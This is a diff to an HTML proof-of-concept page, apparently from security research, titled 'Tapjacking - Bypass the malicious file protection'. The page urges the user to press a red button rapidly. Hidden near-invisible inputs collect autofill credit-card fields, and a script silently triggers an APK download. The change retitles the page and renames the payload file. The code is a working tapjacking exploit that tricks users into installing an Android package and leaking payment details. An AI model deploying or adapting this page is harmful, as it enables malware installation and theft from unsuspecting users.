@@ -28,7 +28,7 @@ input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
 </style>
 </head>
 <body>
-<h1>PoC: Trigger APK download on double tap</h1>
+<h1>Tapjacking - Bypass the malicious file protection</h1>
 
 <!-- Red button -->
 <button id="redButton" title="Red Button"></button>
@@ -52,7 +52,7 @@ input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
 <input name="cc-exp-month" autocomplete="cc-exp-month">
 <input name="cc-exp-year" autocomplete="cc-exp-year">
 
-<p id="instructions">Double tap anywhere to download testtesttest.apk</p>
+<p id="instructions">Press the red button as fast as you can</p>
 
 <script>
 var inputElem;
@@ -91,8 +91,8 @@ inputElem.addEventListener('change', (e) => {
 // Trigger APK download
 function downloadApk() {
   const apkLink = document.createElement('a');
-  apkLink.href = 'testtesttest.apk'; // Make sure this file is hosted and accessible
-  apkLink.download = 'testtesttest.apk';
+  apkLink.href = 'qwerty.apk'; // Make sure this file is hosted and accessible
+  apkLink.download = 'qwerty.apk';
   document.body.appendChild(apkLink);
   apkLink.click();
   document.body.removeChild(apkLink);
